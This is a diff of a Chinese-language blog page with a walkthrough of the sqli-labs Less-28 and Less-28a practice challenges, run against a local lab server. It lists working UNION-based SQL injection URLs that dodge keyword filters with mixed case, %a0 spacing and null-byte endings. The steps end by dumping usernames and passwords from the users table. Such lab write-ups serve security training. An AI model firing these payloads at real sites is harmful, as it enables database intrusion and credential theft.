@@ -78,7 +78,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/17/sql-labs-Less-28/">sql-labs-Less-28</a>
+      <a class="article-title" href="/2021/02/17/sql-labs-Less-28/">sql-labs-Less-28-28a</a>
     </h1>
   
 
@@ -86,8 +86,12 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-28/%EF%BC%8C%E8%BE%93%E5%85%A5&#39;)%E6%B2%A1%E6%9C%89%E5%9B%9E%E6%98%BE%EF%BC%8C%E8%AF%B4%E6%98%8E%E4%B8%8D%E8%83%BD%E7%94%A8%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E3%80%82%E5%9C%A8%E8%BE%93%E5%85%A5;%00%E6%AD%A3%E5%B8%B8%E8%BE%93%E5%87%BA%EF%BC%8C%E8%AF%B4%E6%98%8E%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E6%98%AF&#39;)%E3%80%82">http://127.0.0.1/sql/Less-28/，输入&#39;)没有回显，说明不能用报错注入。在输入;%00正常输出，说明注入字符是&#39;)。</a><br>如果用闭合法的话可能会误判注入字符为’。<br>接下来跟Less-27差不多，可以用联合注入和延时注入。<br>查列数：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-28/?id=1&#39;%a0order%a0by%a03;%00">http://127.0.0.1/sql/Less-28/?id=1&#39;%a0order%a0by%a03;%00</a><br>测位置：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-28/?id=1&#39;uNion%a0sElect%a01,2,3;%00">http://127.0.0.1/sql/Less-28/?id=1&#39;uNion%a0sElect%a01,2,3;%00</a><br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-28/?id=1&#39;uNion%a0sElect%a01,database(),3;%00">http://127.0.0.1/sql/Less-28/?id=1&#39;uNion%a0sElect%a01,database(),3;%00</a><br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-28/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=&#39;security&#39;),3;%00">http://127.0.0.1/sql/Less-28/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=&#39;security&#39;),3;%00</a><br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-28/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=&#39;users&#39;),3;%00">http://127.0.0.1/sql/Less-28/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=&#39;users&#39;),3;%00</a><br>爆数据：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-28/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(username)%a0from%a0users),(sElect%a0group_concat(password)%a0from%a0users);%00">http://127.0.0.1/sql/Less-28/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(username)%a0from%a0users),(sElect%a0group_concat(password)%a0from%a0users);%00</a></p>
+        <h1>Less-28</h1>
 
+<p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-28/%EF%BC%8C%E8%BE%93%E5%85%A5&#39;)%E6%B2%A1%E6%9C%89%E5%9B%9E%E6%98%BE%EF%BC%8C%E8%AF%B4%E6%98%8E%E4%B8%8D%E8%83%BD%E7%94%A8%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E3%80%82%E5%9C%A8%E8%BE%93%E5%85%A5;%00%E6%AD%A3%E5%B8%B8%E8%BE%93%E5%87%BA%EF%BC%8C%E8%AF%B4%E6%98%8E%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E6%98%AF&#39;)%E3%80%82">http://127.0.0.1/sql/Less-28/，输入&#39;)没有回显，说明不能用报错注入。在输入;%00正常输出，说明注入字符是&#39;)。</a><br>如果用闭合法的话可能会误判注入字符为’。<br>接下来跟Less-27差不多，可以用联合注入和延时注入。<br>查列数：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-28/?id=1&#39;%a0order%a0by%a03;%00">http://127.0.0.1/sql/Less-28/?id=1&#39;%a0order%a0by%a03;%00</a><br>测位置：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-28/?id=1&#39;uNion%a0sElect%a01,2,3;%00">http://127.0.0.1/sql/Less-28/?id=1&#39;uNion%a0sElect%a01,2,3;%00</a><br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-28/?id=1&#39;uNion%a0sElect%a01,database(),3;%00">http://127.0.0.1/sql/Less-28/?id=1&#39;uNion%a0sElect%a01,database(),3;%00</a><br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-28/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=&#39;security&#39;),3;%00">http://127.0.0.1/sql/Less-28/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=&#39;security&#39;),3;%00</a><br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-28/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=&#39;users&#39;),3;%00">http://127.0.0.1/sql/Less-28/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=&#39;users&#39;),3;%00</a><br>爆数据：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-28/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(username)%a0from%a0users),(sElect%a0group_concat(password)%a0from%a0users);%00">http://127.0.0.1/sql/Less-28/?id=1&#39;uNion%a0sElect%a01,(sElect%a0group_concat(username)%a0from%a0users),(sElect%a0group_concat(password)%a0from%a0users);%00</a></p>
+<h1>Less-28a</h1>
+从页面就可以看出它只过滤了union和select其他的没有变。
+注入字符是')，union和select和Less-28一样，其他都跟Less-1差不多，不能用报错注入。
       
     </div>
     <footer class="article-footer">
@@ -542,7 +546,7 @@ https://www.cnblogs.com/cute-puli/p/11145758.html
       <ul>
         
           <li>
-            <a href="/2021/02/17/sql-labs-Less-28/">sql-labs-Less-28</a>
+            <a href="/2021/02/17/sql-labs-Less-28/">sql-labs-Less-28-28a</a>
           </li>
         
           <li>
